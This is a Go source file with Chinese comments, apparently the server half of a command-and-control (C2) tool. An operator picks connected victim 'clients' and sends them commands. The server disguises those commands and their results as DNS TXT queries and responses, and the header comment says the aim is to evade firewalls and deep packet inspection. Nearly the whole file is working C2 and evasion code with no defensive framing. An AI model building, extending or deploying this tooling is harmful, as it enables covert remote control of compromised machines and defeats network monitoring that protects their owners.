/*
DNS伪装通信架构说明：

1. 控制端 <--TCP--> C2服务器 <--DNS伪装--> 客户端

通信层次：
- 控制端到C2服务器：使用原始TCP通信，方便管理和控制
- C2服务器到客户端：使用DNS伪装技术，绕过网络检测

DNS伪装原理：
- 将命令和数据封装在DNS查询/响应包中
- 使用TXT记录传输Base64编码的数据
- 伪装成正常的DNS流量，规避防火墙和DPI检测
- 支持双向通信：查询包传输命令，响应包传输结果

DNS包结构：
- Header: 标准DNS头部（12字节）
- Question: 包含编码命令的域名查询
- Answer: 包含编码响应的TXT记录（仅响应包）

编码方式：
- 使用自定义Base64编码避免DNS域名特殊字符
- 命令域名格式: [base64_command].cmd.example.com
- 响应域名格式: resp.example.com (数据在TXT记录中)
*/

package server

import (
	"bufio"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

// DNS消息结构定义，用于将TCP数据伪装成DNS查询/响应
type DNSHeader struct {
	ID      uint16 // 会话标识符
	Flags   uint16 // 标志位
	QDCount uint16 // 查询数量
	ANCount uint16 // 回答数量
	NSCount uint16 // 权威记录数量
	ARCount uint16 // 附加记录数量
}

// DNS查询类型常量
const (
	DNS_TYPE_A     = 1  // A记录
	DNS_TYPE_AAAA  = 28 // AAAA记录
	DNS_TYPE_CNAME = 5  // CNAME记录
	DNS_TYPE_TXT   = 16 // TXT记录 - 用于传输命令和数据
	DNS_CLASS_IN   = 1  // Internet类
)

// DNS标志位定义
const (
	DNS_FLAG_QR = 0x8000 // 查询(0)/响应(1)
	DNS_FLAG_AA = 0x0400 // 权威回答
	DNS_FLAG_RD = 0x0100 // 递归期望
	DNS_FLAG_RA = 0x0080 // 递归可用
)

// DNS伪装相关常量
const (
	DNS_MAX_PAYLOAD    = 512            // DNS UDP最大载荷
	DNS_DOMAIN_SUFFIX  = ".example.com" // 伪装域名后缀
	COMMAND_SUBDOMAIN  = "cmd"          // 命令子域名
	RESPONSE_SUBDOMAIN = "resp"         // 响应子域名
)

// Controller 表示与控制端的通信会话
type Controller struct {
	conn         net.Conn
	server       *Server
	reader       *bufio.Reader
	activeClient *Client
}

// NewController 创建新的控制端通信会话
func NewController(conn net.Conn, server *Server) *Controller {
	return &Controller{
		conn:   conn,
		server: server,
		reader: bufio.NewReader(conn),
	}
}

// handleCommands 处理来自控制端的命令，控制端使用原始TCP通信
func (c *Controller) handleCommands() {
	defer c.conn.Close()

	// 发送欢迎消息，说明与客户端的通信将使用DNS伪装
	c.sendMessage("C2服务器已连接，与客户端的通信将使用DNS伪装技术")

	for {
		// 发送普通TCP格式的命令提示符
		c.sendMessage("> ")

		// 读取普通TCP命令数据
		cmdStr, err := c.reader.ReadString('\n')
		if err != nil {
			fmt.Println("读取控制端命令失败:", err)
			break
		}

		cmdStr = strings.TrimSpace(cmdStr)
		if cmdStr == "" {
			continue
		}

		// 处理命令
		if cmdStr == "exit" {
			c.sendMessage("断开连接")
			break
		} else if cmdStr == "list nodes" {
			c.handleListNodes()
		} else if strings.HasPrefix(cmdStr, "choose ") {
			c.handleChooseNode(cmdStr)
		} else if c.activeClient != nil {
			// 如果已选择客户端，将命令通过DNS伪装转发给它
			c.handleClientCommandWithDNS(cmdStr)
		} else {
			c.sendMessage("未知命令或未选择客户端。请先使用 'choose <id>' 选择客户端。")
		}
	}
}

// handleListNodes 处理list nodes命令，使用TCP通信响应控制端
func (c *Controller) handleListNodes() {
	clients := c.server.ListClients()
	if len(clients) == 0 {
		c.sendMessage("没有客户端连接")
		return
	}

	message := "已连接的客户端:\n"
	for _, client := range clients {
		message += fmt.Sprintf("%s\n", client.GetInfo())
	}
	c.sendMessage(message)
}

// handleChooseNode 处理choose命令，使用TCP通信响应控制端
func (c *Controller) handleChooseNode(cmdStr string) {
	parts := strings.Split(cmdStr, " ")
	if len(parts) != 2 {
		c.sendMessage("无效的命令格式。使用方法: choose <id>")
		return
	}

	id, err := strconv.Atoi(parts[1])
	if err != nil {
		c.sendMessage("无效的客户端ID")
		return
	}

	client := c.server.GetClient(id)
	if client == nil {
		c.sendMessage(fmt.Sprintf("未找到ID为 %d 的客户端", id))
		return
	}

	c.activeClient = client
	c.sendMessage(fmt.Sprintf("已选择客户端 #%d", id))
}

// handleClientCommandWithDNS 处理发送到客户端的命令，使用DNS伪装与客户端通信
func (c *Controller) handleClientCommandWithDNS(cmdStr string) {
	// 注意：这里调用client.SendCommand时，客户端会使用DNS伪装接收和响应
	result, err := c.activeClient.SendCommand(cmdStr)
	if err != nil {
		c.sendMessage(fmt.Sprintf("命令执行失败: %v", err))
		// 如果客户端断开连接，重置当前活动客户端
		if strings.Contains(err.Error(), "断开连接") {
			c.server.RemoveClient(c.activeClient.ID)
			c.activeClient = nil
		}
		return
	}

	// 通过普通TCP发送结果给控制端
	responseMessage := fmt.Sprintf("客户端 #%d 返回结果:\n%s", c.activeClient.ID, result)
	c.sendMessage(responseMessage)
}

// readDNSMessage 从连接中读取DNS伪装的消息
func (c *Controller) readDNSMessage() (string, error) {
	// 读取DNS消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	_, err := c.conn.Read(lengthBytes)
	if err != nil {
		return "", fmt.Errorf("读取DNS消息长度失败: %w", err)
	}

	messageLength := binary.BigEndian.Uint16(lengthBytes)
	if messageLength == 0 {
		return "", fmt.Errorf("无效的DNS消息长度")
	}

	// 读取完整的DNS消息
	dnsData := make([]byte, messageLength)
	_, err = c.conn.Read(dnsData)
	if err != nil {
		return "", fmt.Errorf("读取DNS消息数据失败: %w", err)
	}

	// 解析DNS查询，提取实际命令
	command, _, err := c.parseDNSQuery(dnsData)
	if err != nil {
		return "", fmt.Errorf("解析DNS查询失败: %w", err)
	}

	return command, nil
}

// sendDNSMessage 向控制端发送DNS伪装的消息
func (c *Controller) sendDNSMessage(message string) {
	// 创建DNS响应消息
	queryID := generateDNSID()
	dnsResponse := c.createDNSResponse(queryID, message)

	// 发送消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(dnsResponse)))

	_, err := c.conn.Write(lengthBytes)
	if err != nil {
		fmt.Println("发送DNS消息长度失败:", err)
		return
	}

	// 发送DNS响应数据
	_, err = c.conn.Write(dnsResponse)
	if err != nil {
		fmt.Println("发送DNS响应数据失败:", err)
		return
	}

	// 添加短暂延迟确保数据完整传输
	time.Sleep(5 * time.Millisecond)
}

// sendMessage 原始的消息发送方法（保留作为备用）
func (c *Controller) sendMessage(msg string) {
	// 确保消息以换行符结尾
	if !strings.HasSuffix(msg, "\n") {
		msg += "\n"
	}

	// 分块发送大消息
	const chunkSize = 1024 // 1KB一块
	messageLength := len(msg)

	for i := 0; i < messageLength; i += chunkSize {
		end := i + chunkSize
		if end > messageLength {
			end = messageLength
		}

		chunk := msg[i:end]
		_, err := c.conn.Write([]byte(chunk))
		if err != nil {
			fmt.Println("向控制端发送消息失败:", err)
			return
		}

		// 短暂延迟确保接收端能处理
		if messageLength > chunkSize {
			time.Sleep(5 * time.Millisecond)
		}
	}
}

// generateDNSID 生成DNS消息ID
func generateDNSID() uint16 {
	var id [2]byte
	rand.Read(id[:])
	return binary.BigEndian.Uint16(id[:])
}

// encodeDNSHeader 编码DNS头部
func encodeDNSHeader(header *DNSHeader) []byte {
	buf := make([]byte, 12)
	binary.BigEndian.PutUint16(buf[0:2], header.ID)
	binary.BigEndian.PutUint16(buf[2:4], header.Flags)
	binary.BigEndian.PutUint16(buf[4:6], header.QDCount)
	binary.BigEndian.PutUint16(buf[6:8], header.ANCount)
	binary.BigEndian.PutUint16(buf[8:10], header.NSCount)
	binary.BigEndian.PutUint16(buf[10:12], header.ARCount)
	return buf
}

// decodeDNSHeader 解码DNS头部
func decodeDNSHeader(data []byte) (*DNSHeader, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("DNS头部数据不足")
	}

	header := &DNSHeader{
		ID:      binary.BigEndian.Uint16(data[0:2]),
		Flags:   binary.BigEndian.Uint16(data[2:4]),
		QDCount: binary.BigEndian.Uint16(data[4:6]),
		ANCount: binary.BigEndian.Uint16(data[6:8]),
		NSCount: binary.BigEndian.Uint16(data[8:10]),
		ARCount: binary.BigEndian.Uint16(data[10:12]),
	}
	return header, nil
}

// encodeDomainName 编码域名为DNS格式
// 例如: "cmd.example.com" -> [3]cmd[7]example[3]com[0]
func encodeDomainName(domain string) []byte {
	if domain == "" {
		return []byte{0}
	}

	parts := strings.Split(domain, ".")
	var result []byte

	for _, part := range parts {
		if len(part) > 63 {
			part = part[:63] // DNS标签最大63字符
		}
		result = append(result, byte(len(part)))
		result = append(result, []byte(part)...)
	}
	result = append(result, 0) // 域名结束标记
	return result
}

// decodeDomainName 解码DNS格式的域名
func decodeDomainName(data []byte, offset int) (string, int, error) {
	if offset >= len(data) {
		return "", offset, fmt.Errorf("域名数据偏移超界")
	}

	var parts []string
	originalOffset := offset

	for {
		if offset >= len(data) {
			return "", originalOffset, fmt.Errorf("域名数据不完整")
		}

		length := int(data[offset])
		offset++

		if length == 0 {
			break // 域名结束
		}

		if length > 63 {
			return "", originalOffset, fmt.Errorf("无效的域名标签长度")
		}

		if offset+length > len(data) {
			return "", originalOffset, fmt.Errorf("域名标签数据不完整")
		}

		part := string(data[offset : offset+length])
		parts = append(parts, part)
		offset += length
	}

	domain := strings.Join(parts, ".")
	return domain, offset, nil
}

// createDNSQuery 创建DNS查询消息，用于封装命令数据
func (c *Controller) createDNSQuery(command string) []byte {
	// 创建DNS头部
	header := &DNSHeader{
		ID:      generateDNSID(),
		Flags:   DNS_FLAG_RD, // 设置递归期望标志
		QDCount: 1,           // 一个查询
		ANCount: 0,
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 创建查询域名，将命令编码到域名中
	// 使用base64编码命令以避免域名特殊字符问题
	commandEncoded := encodeBase64(command)
	queryDomain := fmt.Sprintf("%s.%s%s", commandEncoded, COMMAND_SUBDOMAIN, DNS_DOMAIN_SUFFIX)

	// 编码查询域名
	encodedDomain := encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 添加查询类型和类别 (TXT记录, IN类)
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	return dnsPacket
}

// createDNSResponse 创建DNS响应消息，用于封装响应数据
func (c *Controller) createDNSResponse(queryID uint16, responseData string) []byte {
	// 创建DNS响应头部
	header := &DNSHeader{
		ID:      queryID,
		Flags:   DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA, // 响应标志
		QDCount: 1,                                                     // 原始查询
		ANCount: 1,                                                     // 一个回答
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 重构原始查询部分
	queryDomain := fmt.Sprintf("%s%s", RESPONSE_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	encodedDomain := encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 添加回答部分
	// 名称压缩指针指向查询部分的域名
	namePointer := []byte{0xc0, 0x0c} // 压缩指针指向偏移12的位置
	dnsPacket = append(dnsPacket, namePointer...)

	// 类型和类别
	dnsPacket = append(dnsPacket, typeAndClass...)

	// TTL (生存时间) - 设置为300秒
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	dnsPacket = append(dnsPacket, ttl...)

	// TXT记录数据
	encodedResponse := encodeBase64(responseData)
	if len(encodedResponse) > 255 {
		encodedResponse = encodedResponse[:255] // TXT记录最大255字符
	}

	// 数据长度
	dataLength := make([]byte, 2)
	binary.BigEndian.PutUint16(dataLength, uint16(len(encodedResponse)+1))
	dnsPacket = append(dnsPacket, dataLength...)

	// TXT记录数据 (长度前缀 + 数据)
	dnsPacket = append(dnsPacket, byte(len(encodedResponse)))
	dnsPacket = append(dnsPacket, []byte(encodedResponse)...)

	return dnsPacket
}

// parseDNSQuery 解析DNS查询消息，提取命令数据
func (c *Controller) parseDNSQuery(data []byte) (string, uint16, error) {
	// 解析DNS头部
	header, err := decodeDNSHeader(data)
	if err != nil {
		return "", 0, fmt.Errorf("解析DNS头部失败: %w", err)
	}

	if header.QDCount == 0 {
		return "", header.ID, fmt.Errorf("DNS查询没有问题部分")
	}

	// 解析查询域名
	domain, _, err := decodeDomainName(data, 12)
	if err != nil {
		return "", header.ID, fmt.Errorf("解析域名失败: %w", err)
	}

	// 从域名中提取命令
	if !strings.Contains(domain, COMMAND_SUBDOMAIN) {
		return "", header.ID, fmt.Errorf("不是命令查询域名")
	}

	// 提取编码的命令部分
	parts := strings.Split(domain, ".")
	if len(parts) < 2 {
		return "", header.ID, fmt.Errorf("域名格式不正确")
	}

	encodedCommand := parts[0]
	command, err := decodeBase64(encodedCommand)
	if err != nil {
		return "", header.ID, fmt.Errorf("解码命令失败: %w", err)
	}

	return command, header.ID, nil
}

// encodeBase64 简单的base64编码实现（用于DNS域名安全）
func encodeBase64(data string) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
	input := []byte(data)
	var result strings.Builder

	for i := 0; i < len(input); i += 3 {
		var a, b, c byte
		a = input[i]
		if i+1 < len(input) {
			b = input[i+1]
		}
		if i+2 < len(input) {
			c = input[i+2]
		}

		result.WriteByte(chars[a>>2])
		result.WriteByte(chars[((a&0x03)<<4)|((b&0xf0)>>4)])

		if i+1 < len(input) {
			result.WriteByte(chars[((b&0x0f)<<2)|((c&0xc0)>>6)])
		}
		if i+2 < len(input) {
			result.WriteByte(chars[c&0x3f])
		}
	}

	return result.String()
}

// decodeBase64 简单的base64解码实现
func decodeBase64(encoded string) (string, error) {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"

	// 创建解码表
	decodeTable := make(map[byte]byte)
	for i, c := range chars {
		decodeTable[byte(c)] = byte(i)
	}

	input := []byte(encoded)
	var result []byte

	for i := 0; i < len(input); i += 4 {
		var a, b, c, d byte = 0, 0, 0, 0

		if i < len(input) {
			if val, ok := decodeTable[input[i]]; ok {
				a = val
			}
		}
		if i+1 < len(input) {
			if val, ok := decodeTable[input[i+1]]; ok {
				b = val
			}
		}
		if i+2 < len(input) {
			if val, ok := decodeTable[input[i+2]]; ok {
				c = val
			}
		}
		if i+3 < len(input) {
			if val, ok := decodeTable[input[i+3]]; ok {
				d = val
			}
		}

		result = append(result, (a<<2)|((b&0x30)>>4))
		if i+2 < len(input) {
			result = append(result, ((b&0x0f)<<4)|((c&0x3c)>>2))
		}
		if i+3 < len(input) {
			result = append(result, ((c&0x03)<<6)|d)
		}
	}

	return string(result), nil
}

// ==============================================
// DNS伪装专用函数 - 仅用于与客户端通信
// ==============================================

// sendDNSCommandToClient 向客户端发送DNS伪装的命令
// 这个函数会被Client结构体调用，用于将控制端的命令通过DNS伪装发送给客户端
func (c *Controller) sendDNSCommandToClient(clientConn net.Conn, command string) error {
	// 创建DNS查询消息，将命令伪装成DNS查询
	dnsQuery := c.createDNSQuery(command)

	fmt.Printf("[调试] 创建DNS查询，命令: %s，长度: %d 字节\n", command, len(dnsQuery))

	// 设置写入超时
	clientConn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer clientConn.SetWriteDeadline(time.Time{})

	// 发送消息长度（前2字节，模拟TCP over DNS）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(dnsQuery)))

	_, err := clientConn.Write(lengthBytes)
	if err != nil {
		return fmt.Errorf("发送DNS查询长度失败: %w", err)
	}

	// 发送DNS查询数据
	totalWritten := 0
	for totalWritten < len(dnsQuery) {
		n, err := clientConn.Write(dnsQuery[totalWritten:])
		if err != nil {
			return fmt.Errorf("发送DNS查询数据失败(已发送%d/%d字节): %w", totalWritten, len(dnsQuery), err)
		}
		totalWritten += n
	}

	fmt.Printf("[调试] 成功发送DNS查询: %d 字节\n", totalWritten)

	return nil
}

// readDNSResponseFromClient 从客户端读取DNS伪装的响应
// 这个函数会被Client结构体调用，用于接收客户端通过DNS伪装发送的命令执行结果
func (c *Controller) readDNSResponseFromClient(clientConn net.Conn) (string, error) {
	// 设置读取超时，避免无限等待
	clientConn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer clientConn.SetReadDeadline(time.Time{})

	// 读取DNS消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	n, err := clientConn.Read(lengthBytes)
	if err != nil {
		return "", fmt.Errorf("读取DNS响应长度失败: %w", err)
	}
	if n != 2 {
		return "", fmt.Errorf("DNS响应长度字节不完整，期望2字节，实际%d字节", n)
	}

	messageLength := binary.BigEndian.Uint16(lengthBytes)
	if messageLength == 0 {
		return "", fmt.Errorf("无效的DNS响应长度: %d", messageLength)
	}

	fmt.Printf("[调试] 接收DNS响应长度: %d 字节\n", messageLength)

	// 读取完整的DNS响应
	dnsData := make([]byte, messageLength)
	totalRead := 0
	for totalRead < int(messageLength) {
		n, err := clientConn.Read(dnsData[totalRead:])
		if err != nil {
			return "", fmt.Errorf("读取DNS响应数据失败(已读取%d/%d字节): %w", totalRead, messageLength, err)
		}
		totalRead += n
	}

	fmt.Printf("[调试] 成功读取DNS响应: %d 字节\n", totalRead)

	// 解析DNS响应，提取实际结果
	result, err := c.parseDNSResponse(dnsData)
	if err != nil {
		return "", fmt.Errorf("解析DNS响应失败: %w", err)
	}

	return result, nil
}

// parseDNSResponse 解析DNS响应消息，提取响应数据
func (c *Controller) parseDNSResponse(data []byte) (string, error) {
	// 解析DNS头部
	header, err := decodeDNSHeader(data)
	if err != nil {
		return "", fmt.Errorf("解析DNS响应头部失败: %w", err)
	}

	if header.ANCount == 0 {
		return "", fmt.Errorf("DNS响应没有回答部分")
	}

	// 跳过查询部分，找到回答部分
	offset := 12 // DNS头部长度

	// 跳过查询域名
	_, newOffset, err := decodeDomainName(data, offset)
	if err != nil {
		return "", fmt.Errorf("跳过查询域名失败: %w", err)
	}
	offset = newOffset + 4 // 跳过类型和类别

	// 解析回答部分
	// 跳过名称（可能是压缩指针）
	if offset+2 > len(data) {
		return "", fmt.Errorf("回答部分数据不足")
	}

	if data[offset]&0xC0 == 0xC0 {
		// 压缩指针，跳过2字节
		offset += 2
	} else {
		// 普通域名，需要解析
		_, newOffset, err := decodeDomainName(data, offset)
		if err != nil {
			return "", fmt.Errorf("解析回答域名失败: %w", err)
		}
		offset = newOffset
	}

	// 跳过类型、类别、TTL
	offset += 8

	// 读取数据长度
	if offset+2 > len(data) {
		return "", fmt.Errorf("数据长度字段不足")
	}
	dataLength := binary.BigEndian.Uint16(data[offset : offset+2])
	offset += 2

	// 读取TXT记录数据
	if offset+int(dataLength) > len(data) {
		return "", fmt.Errorf("TXT记录数据不足")
	}

	// TXT记录格式：长度前缀 + 数据
	txtLength := int(data[offset])
	offset++

	if txtLength > int(dataLength)-1 {
		return "", fmt.Errorf("TXT记录长度不正确")
	}

	encodedData := string(data[offset : offset+txtLength])

	// 解码base64数据
	result, err := decodeBase64(encodedData)
	if err != nil {
		return "", fmt.Errorf("解码响应数据失败: %w", err)
	}

	return result, nil
}
